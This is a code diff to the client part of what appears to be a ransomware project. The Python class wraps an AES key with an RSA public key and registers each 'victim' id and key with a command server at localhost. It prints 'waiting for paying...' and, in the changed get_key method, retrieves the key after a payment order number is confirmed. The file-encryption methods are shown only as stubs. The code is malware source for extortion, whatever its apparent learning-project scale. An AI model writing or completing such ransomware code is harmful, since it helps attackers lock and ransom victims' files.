@@ -9,14 +9,13 @@ from Crypto.Hash import SHA
 
 CUR_PATH = os.path.dirname(__file__)
 
-with open(CUR_PATH + '/pubkey', 'r') as f:
+with open(f'{CUR_PATH}/pubkey', 'r') as f:
     PUB_KEY = RSA.importKey(f.read())
 ADD_URL = 'http://localhost:5000/victims/add'
 GET_URL = 'http://localhost:5000/victims/'
 HEADER = {
         "content-type": "application/json"
     }
-
 
 class Client():
     def __init__(self):
@@ -32,8 +31,7 @@ class Client():
         self.enc_key()
         data = {
             'id': self.id,
-            'aes_key': self.aes_key,
-            'ransom': False
+            'aes_key': self.aes_key
         }
         self.post_server(data, ADD_URL)
         print('waiting for paying...')
@@ -52,7 +50,6 @@ class Client():
         # return b64decode(result).decode()
         self.aes_key = b64encode(result).decode()
 
-
     def dec_key(self):
         print('decrypting key...')
         pass
@@ -65,15 +62,20 @@ class Client():
         print('decrypting file...')
         pass
 
-    def get_key(self):
+    def get_key(self, out_trade_no=None):
         data = {
             'id': self.id,
             'aes_key': self.aes_key,
-            'ransom': True
+            'ransom': True,
+            'out_trade_no': out_trade_no
         }        
         res = self.post_server(data, GET_URL + self.id)
-        self.aes_key = res['aes_key']
-        print('get aes_key success')
+        if res['status'] == 'success':
+            self.aes_key = res['aes_key']
+            print('get aes_key success')
+            return True
+        else:
+            return False
 
     @staticmethod
     def post_server(data, url):
